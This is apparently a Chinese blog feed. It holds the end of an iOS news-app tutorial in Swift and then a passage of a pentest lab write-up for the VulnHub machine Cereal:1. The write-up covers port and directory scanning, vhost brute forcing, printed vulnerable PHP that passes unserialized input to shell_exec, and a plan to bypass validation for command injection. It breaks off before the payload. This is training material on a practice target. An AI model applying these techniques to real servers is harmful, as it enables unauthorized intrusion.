class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">var</span> cellData: [[<span class="type">String</span>]] <span class="operator">=</span> []</span><br></pre></td></tr></table></figure><p>其为一个字符串的二维数组，每一行对应 tableView 中相同行数的 cell 的数据，每一列分别对应：正文 url、文章标题、文章日期。</p><h4 id="下拉和上拉刷新"><a href="#下拉和上拉刷新" class="headerlink" title="下拉和上拉刷新"></a>下拉和上拉刷新</h4><blockquote><p>使用了 Github 上开源的包：<a href="https://github.com/CoderMJLee/MJRefresh">MJRefresh</a></p></blockquote><p>创建变量 header、footer：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">let</span> header <span class="operator">=</span> <span class="type">MJRefreshNormalHeader</span>()            <span class="comment">// 顶部刷新</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">let</span> footer <span class="operator">=</span> <span class="type">MJRefreshAutoNormalFooter</span>()        <span class="comment">// 底部刷新</span></span><br></pre></td></tr></table></figure><p>将其部署到视图中并设置事件响应方法：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">header.setRefreshingTarget(<span class="keyword">self</span>, refreshingAction: <span class="keyword">#selector</span>(pullRefresh))</span><br><span class="line">footer.setRefreshingTarget(<span class="keyword">self</span>, refreshingAction: <span class="keyword">#selector</span>(pullMore))</span><br></pre></td></tr></table></figure><p>在方法 pullRefresh 中将重复上文所述的请求目录第一页的操作，并将现有数据清空。</p><p>在方法 pullMore 中将请求下一页的目录信息，并将结果追加在现有数据之后，即实现用户下拉加载更多内容：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">requestQueue.async &#123;</span><br><span class="line">   <span class="comment">// 将当前页数加一</span></span><br><span class="line">   <span class="keyword">let</span> pageNum: <span class="type">Int</span> <span class="operator">=</span> <span class="keyword">self</span>.pageNum <span class="operator">+</span> <span class="number">1</span></span><br><span class="line">   <span class="comment">// url 前缀 + 页号 + .htm 即为该板块对应页的 url</span></span><br><span class="line">   <span class="keyword">let</span> curUrl <span class="operator">=</span> <span class="type">URL</span>(string: <span class="keyword">self</span>.url <span class="operator">+</span> <span class="type">String</span>(pageNum) <span class="operator">+</span> <span class="string">&quot;.htm&quot;</span>)</span><br><span class="line">   <span class="keyword">let</span> task <span class="operator">=</span> <span class="keyword">self</span>.session.dataTask(with: <span class="type">URLRequest</span>(url: curUrl<span class="operator">!</span>))</span><br><span class="line">   <span class="keyword">self</span>.pullMoreTaskId <span class="operator">=</span> task.taskIdentifier</span><br><span class="line">   task.resume()</span><br><span class="line">   <span class="comment">// 更新当前页号</span></span><br><span class="line">   <span class="keyword">self</span>.pageNum <span class="operator">=</span> pageNum</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="界面跳转"><a href="#界面跳转" class="headerlink" title="界面跳转"></a>界面跳转</h4><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// UITableViewDelegate 方法，处理列表项的选中事件</span></span><br><span class="line"><span class="keyword">override</span> <span class="keyword">func</span> <span class="title function_">tableView</span>(<span class="keyword">_</span> <span class="params">tableView</span>: <span class="type">UITableView</span>, <span class="params">didSelectRowAt</span> <span class="params">indexPath</span>: <span class="type">IndexPath</span>) &#123;</span><br><span class="line">   <span class="keyword">self</span>.performSegue(withIdentifier: <span class="string">&quot;ShowDetailView&quot;</span>, sender: <span class="keyword">self</span>.tableView.cellForRow(at: indexPath))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在这个方法中给新页面传递参数</span></span><br><span class="line"><span class="keyword">override</span> <span class="keyword">func</span> <span class="title function_">prepare</span>(<span class="params">for</span> <span class="params">segue</span>: <span class="type">UIStoryboardSegue</span>, <span class="params">sender</span>: <span class="keyword">Any</span><span class="operator">?</span>) &#123;</span><br><span class="line">   <span class="keyword">if</span> segue.identifier <span class="operator">==</span> <span class="string">&quot;ShowDetailView&quot;</span>&#123;</span><br><span class="line">      (segue.destination <span class="keyword">as!</span> <span class="type">ArticleViewController</span>).url <span class="operator">=</span> <span class="type">URL</span>(string: <span class="string">&quot;https://itsc.nju.edu.cn&quot;</span> <span class="operator">+</span> (sender <span class="keyword">as!</span> <span class="type">ArticleTableViewCell</span>).link)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="文章详情页"><a href="#文章详情页" class="headerlink" title="文章详情页"></a>文章详情页</h3><blockquote><p>使用 scrollView 展示文章内容</p></blockquote><p><img src="https://assets.kekwy.com/images/image-20230127201340976.png" alt="image-20230127201340976"></p><p>在 ScrollView 中放置一个空白的 View，其高度跟随自身 y 值最大的子控件的 maxY。加载文章正文时涉及的控件作为子控件加入该 View 即可。 </p><h4 id="内容加载"><a href="#内容加载" class="headerlink" title="内容加载"></a>内容加载</h4><p><strong>使用缓存</strong></p><p>定义 session：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">lazy</span> <span class="keyword">var</span> session: <span class="type">URLSession</span> <span class="operator">=</span> &#123;</span><br><span class="line">   <span class="keyword">let</span> configuration <span class="operator">=</span> <span class="type">URLSessionConfiguration</span>.default</span><br><span class="line">   configuration.waitsForConnectivity <span class="operator">=</span> <span class="literal">true</span></span><br><span class="line">   configuration.timeoutIntervalForResource <span class="operator">=</span> <span class="number">300</span></span><br><span class="line">   <span class="comment">// 优先使用缓存，在缓存中找不到再重新通过网络加载</span></span><br><span class="line">   configuration.requestCachePolicy <span class="operator">=</span> .returnCacheDataElseLoad</span><br><span class="line">   <span class="keyword">return</span> <span class="type">URLSession</span>(configuration: configuration, delegate: <span class="keyword">self</span>, delegateQueue: <span class="literal">nil</span>)</span><br><span class="line">&#125;()</span><br></pre></td></tr></table></figure><p>与之前不同的是，对于已经发布的新闻文章我们可以在第一次加载时将其保存在本地，之后都从本地加载文章内容，直到用户清除缓存。</p><p><strong>加入子控件</strong></p><p>同样使用 scanner 对 html 代码进行解析，根据 itsc 文章正文 html 代码的特征解析出文章标题、正文、图像 url，再根据不同的内容类型生成相应的子控件并设置约束。</p><p>所有的子控件根据其对应内容在正文代码中的顺序从上到下依次排列，每次加入子控件时都需要根据上一个加入的控件设置其 topAnchor 的约束，并将“上一个加入的子控件”更新为当前加入的控件。</p><p>contentView 的高度约束根据最后一个加入的子控件的 bottomAnchor 设置。</p><p><strong>异步加载</strong></p><p>其中在加入图片时，还需要对每个图片进行一次 url 请求，如果在主线程中阻塞等待其结果，则会造成界面卡顿，故我们在这里使用异步加载思路。</p><p>在进行图像的 url 请求时，先在 imageView 中添加一个活动指示器，令其播放“转圈”的加载动画：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> indicator <span class="operator">=</span>  <span class="type">UIActivityIndicatorView</span>()</span><br><span class="line">imageView.addSubview(indicator)</span><br><span class="line">indicator.translatesAutoresizingMaskIntoConstraints <span class="operator">=</span> <span class="literal">false</span></span><br><span class="line">indicator.startAnimating()</span><br><span class="line">indicator.centerXAnchor.constraint(equalTo: imageView.centerXAnchor).isActive <span class="operator">=</span> <span class="literal">true</span></span><br><span class="line">indicator.centerYAnchor.constraint(equalTo: imageView.centerYAnchor).isActive <span class="operator">=</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>再通过 DispatchQueue 的异步执行发送 url 请求，和处理响应内容。</p><p>在成功接收到图像数据后，停止加载动画，并根据图片缩放后的高度更新 imageView 的高度约束。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 停止加载动画</span></span><br><span class="line">indicator.stopAnimating()</span><br><span class="line"><span class="comment">// 移除活动指示器</span></span><br><span class="line">indicator.removeFromSuperview()</span><br><span class="line"><span class="comment">// 更新 imageView 的高度约束</span></span><br><span class="line"><span class="keyword">for</span> constraint <span class="keyword">in</span> imageView.constraints &#123;</span><br><span class="line">   <span class="keyword">if</span> constraint.firstAnchor <span class="operator">==</span> imageView.heightAnchor &#123;</span><br><span class="line">      constraint.constant <span class="operator">=</span> image.size.height <span class="operator">*</span> ( <span class="keyword">self</span>.contentView.frame.width <span class="operator">-</span> <span class="number">32</span>) <span class="operator">/</span> (image.size.width)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="导航栏的隐藏和显示"><a href="#导航栏的隐藏和显示" class="headerlink" title="导航栏的隐藏和显示"></a>导航栏的隐藏和显示</h4><p>实现 scrollView 的代理方法：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">func</span> <span class="title function_">scrollViewDidScroll</span>(<span class="keyword">_</span> <span class="params">scrollView</span>: <span class="type">UIScrollView</span>) &#123;</span><br><span class="line">        </span><br><span class="line">   <span class="keyword">let</span> pan <span class="operator">=</span> scrollView.panGestureRecognizer</span><br><span class="line">   <span class="keyword">let</span> velocity <span class="operator">=</span> pan.velocity(in: scrollView).y</span><br><span class="line">        </span><br><span class="line">   <span class="comment">// 用户向下划屏幕时显示导航栏</span></span><br><span class="line">   <span class="keyword">if</span> velocity <span class="operator">&lt;</span> <span class="operator">-</span><span class="number">10</span> &#123;</span><br><span class="line">      <span class="keyword">self</span>.navigationController<span class="operator">?</span>.setNavigationBarHidden(<span class="literal">true</span>, animated: <span class="literal">true</span>)</span><br><span class="line">      statusBarStyle <span class="operator">=</span> .darkContent</span><br><span class="line">      setNeedsStatusBarAppearanceUpdate()</span><br><span class="line">      <span class="comment">// 用户向上划屏幕时隐藏导航栏</span></span><br><span class="line">   &#125; <span class="keyword">else</span> <span class="keyword">if</span> velocity <span class="operator">&gt;</span> <span class="number">10</span> &#123;</span><br><span class="line">      <span class="keyword">self</span>.navigationController<span class="operator">?</span>.setNavigationBarHidden(<span class="literal">false</span>, animated: <span class="literal">true</span>)</span><br><span class="line">      statusBarStyle <span class="operator">=</span> .lightContent</span><br><span class="line">      setNeedsStatusBarAppearanceUpdate()</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于我们的 APP 导航栏的颜色为“南大紫”，导航栏存在时系统状态栏的颜色是白色，而正文背景是白色，故在导航栏隐藏后，应将系统状态栏颜色改为黑色并刷新。</p><h3 id="关于我们页"><a href="#关于我们页" class="headerlink" title="关于我们页"></a>关于我们页</h3><p>点击按钮清除缓存：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@IBAction</span> <span class="keyword">func</span> <span class="title function_">showAlert</span>(<span class="keyword">_</span> <span class="params">sender</span>: <span class="keyword">Any</span>) &#123;</span><br><span class="line">   <span class="keyword">let</span> alert <span class="operator">=</span> <span class="type">UIAlertController</span>(title: <span class="string">&quot;清除缓存&quot;</span>, message: <span class="string">&quot;清除缓存后相应的内容将会在设备联网时重新加载，这将消耗一定的流量。您确定要清除缓存吗？&quot;</span>, preferredStyle: .alert)</span><br><span class="line">   alert.addAction(<span class="type">UIAlertAction</span>(title: <span class="string">&quot;确定&quot;</span>, style: .default, handler: &#123;<span class="keyword">_</span> <span class="keyword">in</span></span><br><span class="line">      <span class="type">URLCache</span>.shared.removeAllCachedResponses()</span><br><span class="line">   &#125;))</span><br><span class="line">   alert.addAction(<span class="type">UIAlertAction</span>(title: <span class="string">&quot;取消&quot;</span>, style: .default, handler: <span class="literal">nil</span>))</span><br><span class="line">   <span class="keyword">self</span>.present(alert, animated: <span class="literal">true</span>, completion: <span class="literal">nil</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a id="感谢评阅"></a></p><p>【感谢评阅】</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;mailto:&amp;#107;&amp;#x65;&amp;#x65;&amp;#x6b;&amp;#x6b;&amp;#101;&amp;#x77;&amp;#121;&amp;#x40;&amp;#113;&amp;#113;&amp;#x2e;&amp;#99;&amp;#111;&amp;#109;&quot;&gt;&amp;#107;&amp;#x65;&amp;#x65</summary>
      
    
    
    
    <category term="iOS智能应用开发" scheme="http://blog.kekwy.com/categories/iOS%E6%99%BA%E8%83%BD%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="开发" scheme="http://blog.kekwy.com/tags/%E5%BC%80%E5%8F%91/"/>
    
    <category term="iOS" scheme="http://blog.kekwy.com/tags/iOS/"/>
    
    <category term="Xcode" scheme="http://blog.kekwy.com/tags/Xcode/"/>
    
  </entry>
  
  <entry>
    <title>【渗透测试】第十周 vulnhub-Cereal:1</title>
    <link href="http://blog.kekwy.com/vulnhub-Cereal/"/>
    <id>http://blog.kekwy.com/vulnhub-Cereal/</id>
    <published>2022-11-26T07:59:32.000Z</published>
    <updated>2023-12-28T08:10:34.692Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>网络攻防实战 第十次实验</p><p>邮箱：<a href="mailto:&#x6b;&#x65;&#x65;&#107;&#x6b;&#101;&#119;&#x79;&#64;&#x71;&#113;&#x2e;&#99;&#x6f;&#109;">&#x6b;&#x65;&#x65;&#107;&#x6b;&#101;&#119;&#x79;&#64;&#x71;&#113;&#x2e;&#99;&#x6f;&#109;</a></p><p>2022年11月26日</p><p>靶机链接：<a href="https://vulnhub.com/entry/cereal-1,703/">https://vulnhub.com/entry/cereal-1,703/</a></p></blockquote><h2 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h2><p>获取靶机 root 权限和一个 root flag。</p><p>我们将使用以下攻击手段：</p><ul><li>主机发现、端口扫描；</li><li>隐藏路径爆破；</li><li>域名绑定 IP；</li><li>隐藏域名爆破；</li><li>隐藏文件爆破；</li><li>解析 PHP 对象序列并进行命令注入；</li><li>反弹 shell；</li><li>利用 pspy 工具查看靶机上运行的所有进程；</li><li>通过链接文件利用靶机漏洞；</li><li>自定义 root 用户；</li></ul><h2 id="二、实验内容"><a href="#二、实验内容" class="headerlink" title="二、实验内容"></a>二、实验内容</h2><blockquote><p>kali: 10.0.2.15</p><p>靶机: 10.0.2.17</p></blockquote><h3 id="0x00-准备工作"><a href="#0x00-准备工作" class="headerlink" title="0x00. 准备工作"></a>0x00. 准备工作</h3><ol><li><p>获取靶机 IP 并扫描其开放的端口以及个端口上对应的服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -I eth0 -l</span><br><span class="line">sudo nmap -p- 10.0.2.17</span><br></pre></td></tr></table></figure><img src="https://assets.kekwy.com/images/image-20221124223623886.png" alt="image-20221124223623886" style="zoom:150%;" /><p>发现开启了许多端口，经过对各个端口进行简单尝试之后。考虑从 80 端口寻找突破口。</p></li><li><p>访问 80 端口发现是一个 Apache 的默认页面，查看源码也并没有直接可利用的信息：</p><img src="https://assets.kekwy.com/images/image-20221124224018467.png" alt="image-20221124224018467" style="zoom:150%;" /></li><li><p>尝试进行隐藏路径爆破：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.17</span><br></pre></td></tr></table></figure><img src="https://assets.kekwy.com/images/image-20221124224804390.png" alt="image-20221124224804390" style="zoom:150%;" /></li><li><p>访问 <a href="http://10.0.2.17/blog%EF%BC%8C%E5%8F%91%E7%8E%B0%E4%BA%86%E4%B8%80%E4%B8%AA%E6%B2%A1%E6%9C%89%E6%A0%B7%E5%BC%8F%E7%9A%84%E9%A1%B5%E9%9D%A2%EF%BC%8C%E7%96%91%E4%BC%BC%E4%B8%8E%E6%9F%90%E4%B8%80%E5%9F%9F%E5%90%8D%E6%9C%89%E5%85%B3%EF%BC%9A">http://10.0.2.17/blog，发现了一个没有样式的页面，疑似与某一域名有关：</a></p><img src="https://assets.kekwy.com/images/image-20221124225803901.png" alt="image-20221124225803901" style="zoom:150%;" /><p>同时发现该网页是由 WordPress 支持的。</p><ul><li>技巧：访问网页时出现卡顿，然后看到没有加载样式的网页，可推测是 CSS 加载失败，进而寻找是否需要将某一个域名的 IP 加入 hosts 文件中。</li></ul></li><li><p>对 &#x2F;blog 路径进行进一步的路径爆破：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.17/blog/</span><br></pre></td></tr></table></figure><img src="https://assets.kekwy.com/images/image-20221124230403083.png" alt="image-20221124230403083" style="zoom:150%;" /><p>发现目录 wp-admin，并且发现该目录被重定向到了我们刚才发现的那个域名。</p></li><li><p>尝试在 hosts 文件中加入记录 <code>10.0.2.17 cereal.ctf</code> 将该域名与靶机的 IP 地址对应。</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/etc/hosts:</span><br><span class="line">...</span><br><span class="line">10.0.2.17 cereal.ctf</span><br></pre></td></tr></table></figure></li><li><p>重新访问 blog 页面，发现成功加载了样式：</p><img src="https://assets.kekwy.com/images/image-20221124231004932.png" alt="image-20221124231004932" style="zoom:150%;" /></li><li><p>在 80 端口的 web 应用继续进行信息收集，未发现明显的有效信息。</p></li><li><p>尝试从 4441 端口（同样运行着一个 web 应用）继续寻找突破口：</p><img src="https://assets.kekwy.com/images/image-20221125121314821.png" alt="image-20221125121314821" style="zoom:150%;" /><p>直接访问发现只有一行文本内容。</p></li></ol><h3 id="0x01-服务器域名爆破"><a href="#0x01-服务器域名爆破" class="headerlink" title="0x01. 服务器域名爆破"></a>0x01. 服务器域名爆破</h3><ol><li><p>联想到某些服务器可能会根据 HTTP 请求中 HOST 头的不同，为用户返回不同的页面。尝试使用 gobuster 对靶机 44441 端口进行域名爆破：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster vhost -u http://cereal.ctf:44441 --append-domain -w fierce_hostlist.txt</span><br></pre></td></tr></table></figure><ul><li>字典文件在 kali 上的路径为：&#x2F;usr&#x2F;share&#x2F;amass&#x2F;wordlists&#x2F;fierce_hostlist.txt</li></ul><img src="https://assets.kekwy.com/images/image-20221125154012372.png" alt="image-20221125154012372" style="zoom:150%;" /><p>成功扫描出一个域名：<code>secure.cereal.ctf</code></p></li><li><p>将该域名与靶机 IP 关联并添加记录到 kali 的 host 文件中，浏览器访问 <code>http://secure.cereal.ctf:44441/</code>：</p><img src="https://assets.kekwy.com/images/image-20221125154405285.png" alt="image-20221125154405285" style="zoom:150%;" /></li><li><p>发现当前页面可以对指定的 IP 进行 ping 操作，输入 kali 本机的 IP，查看结果：</p><img src="https://assets.kekwy.com/images/image-20221125162041920.png" alt="image-20221125162041920" style="zoom:150%;" /><p>发现确实执行了 ping 操作，查看结果发现与系统命令中的 ping 操作返回结果格式相似，推测此处调用了系统指令，尝试进行命令注入。</p></li></ol><h3 id="0x02-命令注入"><a href="#0x02-命令注入" class="headerlink" title="0x02. 命令注入"></a>0x02. 命令注入</h3><ol><li><p>尝试直接注入未果，使用 burp suite 拦截当前页面点击 ping 按钮之后的请求：</p><img src="https://assets.kekwy.com/images/image-20221125162519586.png" alt="image-20221125162519586" style="zoom:150%;" /><p>发现请求体比较可疑。</p></li><li><p>在 burp suite 中选中请求体中 obj 字段的值，进行解码：</p><img src="https://assets.kekwy.com/images/image-20221125162824732.png" alt="image-20221125162824732" style="zoom:150%;" /><img src="https://assets.kekwy.com/images/image-20221125162901663.png" alt="image-20221125162901663" style="zoom:150%;" /><p>得到了解码结果，猜测是一个经过 php 序列化编码之后的对象数据格式。在请求头中的数据已经进行了序列化，可以推测该编码操作是网页中的脚本代码负责完成的。</p></li><li><p>查看相关的网页源码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">submit_form</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> object = <span class="title function_">serialize</span>(&#123;<span class="attr">ipAddress</span>: <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="string">&quot;ipform&quot;</span>].<span class="property">ip</span>.<span class="property">value</span>&#125;);</span></span><br><span class="line"><span class="language-javascript">object = object.<span class="title function_">substr</span>(object.<span class="title function_">indexOf</span>(<span class="string">&quot;&#123;&quot;</span>),object.<span class="property">length</span>);</span></span><br><span class="line"><span class="language-javascript">object = <span class="string">&quot;O:8:\&quot;pingTest\&quot;:1:&quot;</span> + object;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">forms</span>[<span class="string">&quot;ipform&quot;</span>].<span class="property">obj</span>.<span class="property">value</span> = object;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;ipform&#x27;</span>).<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但是由于不知道服务器程序对该对象序列的处理流程，无法判断出直接有效的注入方式。联想到 blog 页面提示“尝试从备份中恢复”，猜测靶机上可能存在服务程序的备份文件，尝试通过隐藏文件爆破进行寻找。</p><ul><li><p>“We are in the process of restoring from our backups”</p><img src="https://assets.kekwy.com/images/image-20221125171732769.png" alt="image-20221125171732769" style="zoom:150%;" /></li></ul></li></ol><h3 id="0x03-隐藏文件爆破"><a href="#0x03-隐藏文件爆破" class="headerlink" title="0x03. 隐藏文件爆破"></a>0x03. 隐藏文件爆破</h3><ol><li><p>使用 kali 自带的 <code>DirBuster</code> 工具进行爆破：</p><img src="https://assets.kekwy.com/images/image-20221125165830104.png" alt="image-20221125165830104" style="zoom:150%;" /><p>最终发现路径：<code>/back_en</code></p></li><li><p>继续对 &#x2F;back_en 下的文件进行爆破，由于是备份文件，猜测文件名后缀为 <code>.bak</code>：</p><img src="https://assets.kekwy.com/images/image-20221126113550850.png" alt="image-20221126113550850" style="zoom:150%;" /><img src="https://assets.kekwy.com/images/image-20221126113421704.png" alt="image-20221126113421704" style="zoom:150%;" /><p>发现备份文件 <code>index.php.bak</code>。</p></li><li><p>将查找到的备份文件下载到 kali：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://secure.cereal.ctf:44441/back_en/index.php.bak</span><br></pre></td></tr></table></figure><p>查看内容猜测是 ping 页面的后台程序源码，并找到与 ping 功能相关的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pingTest</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$ipAddress</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$isValid</span> = False;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$output</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 如果当前对象中的 isValid 值不为 True</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;isValid) &#123;</span><br><span class="line">            <span class="comment">// 进行了某种过滤</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">filter_var</span>(<span class="variable">$this</span>-&gt;ipAddress, FILTER_VALIDATE_IP))</span><br><span class="line">&#123;</span><br><span class="line">                <span class="comment">// 测试通过才会执行代码</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;isValid = True;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">ping</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ping</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;isValid) &#123;</span><br><span class="line">            <span class="comment">// 指令的执行方式</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;output = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;ping -c 3 <span class="subst">$this</span>-&gt;ipAddress&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;obj&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$pingTest</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;obj&#x27;</span>]));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$pingTest</span> = <span class="keyword">new</span> pingTest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$pingTest</span>-&gt;<span class="title function_ invoke__">validate</span>();</span><br></pre></td></tr></table></figure><p>通过对上述代码进行简单的分析，我们发现只需要我们上传的序列化对象中的 <code>isValid</code> 值本身为 True，就可以绕过服务端对 <code>ipAddress</code> 字段合法性的检测，最终导致靶机执行我们所注入的命令。</p></li></ol><h3 id="0x04-继续命令注入"><a href="#0x04-继续命令注入" class="headerlink" title="0x04. 继续命令注入"></a>0x04. 继续命令注入</h3><p><a id="task1"></a></p><ol><li><p>简单学习 PHP 对象序列的格式之后，对此前解码获得的对象序列进行分析：</p><p><code>O : 8 : &quot;pingTest&quot; : 1 : &#123;s : 9 : &quot;ipAddress&quot;; s : 9 : &quot;127.0.0.1&quot;; &#125;</code></p><ul><li>o：object，表示对象类型；</li><li>8：表示其后的字符串长度为8；</li><li>“pingTest”：表示当前对象为类 <code>pingTest</code> 的一个对象；</li><li>1：表示其后包含1个该对象的属性，花括号中的内容即为对象的属性；</li><li>s：string，表示字符串类型；</li><li>9：其后的字符串长度；</li><li>“ipAddress”：属性的名称；</li><li>“127.0.0.1”：”ipAddress”属性的值；</li></ul><p>参考：<a href="https://blog.csdn.net/qq_31088019/article/details/126519989">PHP序列化和反序列化</a></p></li><li><p>可见请求体中发送给服务器的对象仅包含了 <code>ipAddress</code> 这个一个属性，为了绕过服务端的检测，需要添加 <code>isValid</code> 属性且将其赋值为 